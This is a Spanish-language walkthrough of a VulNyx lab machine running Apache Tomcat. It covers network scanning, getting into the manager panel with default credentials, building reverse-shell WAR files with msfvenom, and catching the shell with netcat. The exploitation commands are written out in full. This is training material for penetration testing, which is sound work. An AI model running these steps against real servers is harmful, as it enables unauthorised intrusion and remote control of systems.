# Hacking Servidor Tomcat

Maquinas a utilizar **Kali Linux y  Deploy** [https://vulnyx.com/#deploy](https://vulnyx.com/#deploy)

Vamos a aprender **como podemos explotar un servidor Apache Tocamcat vulnerable**. Generaremos un payload compatible con tomcat subirlo al servidor y lograr intrusión a la maquina victima, vamos a ver **dos tipos de payload diferentes** que tenemos que probar ante un servidor Tomcat.

```bash
sudo arp-scan -I eth0 --localnet  
```

![image.png](./imagenes/image%20167.png)

```bash
nmap -p- -sS -sV -sC --open -min-rate=5000 -n -vvv -Pn 10.0.3.15 -oN escaneo
```

![image.png](./imagenes/image%20168.png)

Nos encontramos un servidor Apache Tomcat corriendo en el puerto 8080.

<aside>
💡

Apache Tomcat es un servidor web  desarrollado por la Apache Software Foundation. Está diseñado para ejecutar aplicaciones web basadas en Java, como servlets y JavaServer Pages (JSP). Su propósito principal es proporcionar un entorno robusto y eficiente para desplegar aplicaciones web dinámicas.

Entre sus usos más comunes se encuentran:

- **Procesamiento de solicitudes HTTP**: Actúa como un servidor web que recibe y responde a solicitudes HTTP.
- **Ejecución de aplicaciones Java**: Permite ejecutar servlets y JSP, generando contenido dinámico para los usuarios.
- **Despliegue de aplicaciones web**: Facilita el despliegue de aplicaciones mediante archivos WAR (Web Application Archive).
- **Gestión de sesiones**: Ofrece funcionalidades para manejar sesiones de usuario en aplicaciones web.
</aside>

- Vamos a verlo en el navegador web.
    
    ![image.png](./imagenes/image%20169.png)
    
    <aside>
    💡
    
    Lo que vemos es lo que aparece por defecto y sin configurar cuando recién instalamos un servidor Tomcat. 
    
    </aside>
    
    Si nos fijamos tenemos una sección **tomcat9-admin** y un enlace llamado **manager webapp** donde nos pide unas credenciales para acceder a la configuración del Apache tomcat.
    
    ![image.png](./imagenes/image%20170.png)
    

![image.png](./imagenes/image%20171.png)

<aside>
💡

**Trucos a probar**: En Tomcat cundo hacemos una instalación ya viene por defecto unas credenciales activadas.

1. Buscaríamos en Google o en otro buscador los siguiente:
    
    **hacktricks apache tomcat default credentials**
    
    ![image.png](./imagenes/image%20172.png)
    
    [**https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/tomcat/index.html**](./imagenes/https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/tomcat/index.html)
    
    ![image.png](./imagenes/image%20173.png)
    
    Y probaríamos una a una todas las credenciales.
    
2. En el Panel de Login pulsamos a la tecla Cancel.
    
    ![image.png](./imagenes/image%20174.png)
    
    Nos daría un mensaje de error que nos marcaria las credenciales.
    
    ![image.png](./imagenes/image%20175.png)
    
</aside>

- Entramos con las credenciales que hemos encontrado.
    
    ![image.png](./imagenes/image%20176.png)
    

![image.png](./imagenes/image%20177.png)

- Nos encontramos que nos deja subir archivos.
    
    ![image.png](./imagenes/image%20178.png)
    

- Por tanto crearemos un archivo malicioso para subirlo al servidor y ganar intrusión en la maquina.
    - Consultamos nuestra IP.
        
        ```bash
        hostname -I 
        ```
        
        ![image.png](./imagenes/image%20179.png)
        
    
    - Creamos nuestro archivo malicioso.
        
        ```bash
        msfvenom -p java/shell_reverse_tcp LHOST=10.0.3.4 LPORT=443 -f war -o reverse1.war 
        ```
        
        ![image.png](./imagenes/image%20180.png)
        
        <aside>
        💡
        
        **`msfvenom`**:
        Es una herramienta de Metasploit que se utiliza para generar payloads (cargas útiles) que pueden ser usados en pruebas de penetración. Permite personalizar el tipo de ataque, el formato de salida y muchos otros parámetros.
        
        **`p java/shell_reverse_tcp`**:
        Especifica el tipo de payload que quieres crear. En este caso:
        
        - **`java/shell_reverse_tcp`** genera un shell inverso basado en Java que permite al sistema objetivo conectarse de vuelta al atacante (es decir, iniciar una conexión hacia el servidor controlado por el atacante).
        
        **`LHOST=10.0.3.4`**:
        Define la dirección IP del "host local" que recibirá la conexión de retorno desde la máquina objetivo. Es decir, la dirección IP del atacante.
        
        **`LPORT=4443`**:
        Especifica el puerto que estará escuchando en la máquina del atacante para recibir la conexión inversa.
        
        **`f war`**:
        Indica el formato del archivo de salida. En este caso, se utiliza el formato `.war` (Web Application Archive), que es comúnmente desplegado en servidores Java como Apache Tomcat.
        
        **`o reversel.war`**:
        Define el nombre del archivo que se generará como resultado del comando. En este caso, se generará un archivo llamado `reversel.war`.
        
        </aside>
        
    
    En condiciones normales con este payload nos bastaría para ganar intrusión pero todo dependerá de como este hecho el servidor podría funcionar o no. Así que vamos a crear otro distinto por si el primero no funcionara. La diferencia estriba en que tipo de payload reverse vamos a usar en uno usarmeos `java/shell_reverse_tcp` y en otro `java/jsp_shell_reverse_tcp`.
    
    ```bash
    msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.0.3.4 LPORT=443 -f war -o reverse2.war
    ```
    
    ![image.png](./imagenes/image%20181.png)
    
    - Vamos a subir los dos archivos maliciosos.
        
        ![image.png](./imagenes/image%20182.png)
        
        ![image.png](./imagenes/image%20183.png)
        

- Nos ponemos a la escucha con netcat por el puerto que habíamos especificado en msfvenom en mi caso 443.
    
    ![image.png](./imagenes/image%20184.png)
    
- Vamos probando los archivos para ver si funcionan haciendo clip en ellos en el panel web. En mi caso funcionan los dos.
    
    ![image.png](./imagenes/image%20185.png)
    

- Vamos a hacer un **tratamiento de la TTY**
    
    En el apunte: **Primeros pasos tras la Intrusión (Tratamiento de la TTY)**